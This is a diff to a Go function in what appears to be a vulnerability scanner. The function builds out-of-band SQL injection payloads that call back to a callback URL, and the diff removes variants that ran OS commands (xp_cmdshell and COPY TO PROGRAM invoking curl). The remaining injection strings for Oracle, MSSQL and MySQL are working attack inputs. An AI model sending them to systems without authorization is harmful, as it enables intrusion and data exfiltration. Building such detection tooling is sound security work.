@@ -203,35 +203,31 @@ func rceOOBPayloads(cb string) []string {
 // is the bare host[:port]; cb is the full http URL.
 //
 //	Oracle : UTL_HTTP.REQUEST / HTTPURITYPE(...).GETCLOB() — direct HTTP.
-//	MSSQL  : xp_cmdshell 'curl <cb>' (direct HTTP) and xp_dirtree \\host\x
-//	         (SMB/DNS — resolves host even when HTTP egress to us is blocked).
-//	MySQL/PG have no clean HTTP primitive; their OOB path is DNS/SMB via
-//	         LOAD_FILE/COPY, covered by the UNC variant.
+//	MSSQL  : xp_dirtree \\host\token (SMB/DNS resolution, no OS command).
+//	MySQL  : LOAD_FILE over UNC (SMB/DNS lookup). PostgreSQL has no safe,
+//	         built-in network primitive, so no OS-command payload is attempted.
 func sqliOOBPayloads(cb, host string) []string {
-	unc := `\\` + host + `\x`
+	token := "rcnoob"
+	if i := strings.LastIndexByte(cb, '/'); i >= 0 && i+1 < len(cb) {
+		token = cb[i+1:]
+	}
+	uncHost := oobHostOnly(cb)
+	if uncHost == "" {
+		uncHost = host
+	}
+	unc := `\\` + uncHost + `\` + token
 	oracle := "(SELECT UTL_HTTP.REQUEST('" + cb + "') FROM dual)"
 	oracleURI := "(SELECT HTTPURITYPE('" + cb + "').GETCLOB() FROM dual)"
-	mssqlCurl := "EXEC master..xp_cmdshell 'curl -s " + cb + "'"
 	mssqlDir := "EXEC master..xp_dirtree '" + unc + "',1,1"
-	// PostgreSQL — COPY ... TO PROGRAM runs a shell command (superuser); the
-	// canonical PG OOB/RCE primitive, previously absent entirely.
-	pgCopy := "COPY (SELECT '') TO PROGRAM 'curl -s " + cb + "'"
 
 	return []string{
 		// Oracle — inline subselect (string and numeric contexts).
 		"'||" + oracle + "||'",
 		"'||" + oracleURI + "||'",
 		"1||" + oracle,
-		// MSSQL — stacked query (needs multi-statement) in string / numeric / raw.
-		"';" + mssqlCurl + "--",
-		"1;" + mssqlCurl + "--",
-		";" + mssqlCurl + "--",
+		// MSSQL — DB-native directory lookup only; deliberately no xp_cmdshell.
 		"';" + mssqlDir + "--",
-		// PostgreSQL — stacked COPY TO PROGRAM (string / numeric / raw).
-		"';" + pgCopy + "--",
-		"1;" + pgCopy + "--",
-		";" + pgCopy + "--",
-		// MySQL/Postgres/MSSQL — UNC/DNS exfil via file access, string + numeric.
+		// MySQL — UNC/DNS callback via DB-native file access.
 		"' AND LOAD_FILE('" + unc + "')-- -",
 		"1 AND LOAD_FILE('" + unc + "')",
 		// Generic subquery UNC for engines resolving the path during planning.
